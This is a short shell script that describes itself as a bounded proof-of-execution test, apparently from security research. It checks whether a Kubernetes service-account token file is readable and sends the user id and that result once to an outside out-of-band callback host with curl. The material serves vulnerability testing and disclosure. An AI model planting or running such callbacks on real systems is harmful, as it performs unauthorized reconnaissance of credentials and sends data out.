#!/bin/sh
# Test-owned proof: one bounded HTTPS callback per sandbox, no token contents read.
uid="$(id -u)"
readable=false
if test -r /var/run/secrets/kubernetes.io/serviceaccount/token; then readable=true; fi
if ( set -C; : > /tmp/df-mise-3b183fda8b6fb120599761cd1f351b6e.sent ) 2>/dev/null; then
  curl -fsS --max-time 5 --retry 0 -o /dev/null "https://dbqot7gbohko9stoqsk06uyfni43mqfzr.oob.staging.depthfirst.com/dfmise-retest/3b183fda8b6fb120599761cd1f351b6e?uid=$uid&token_readable=$readable" >/dev/null 2>&1 || true
fi
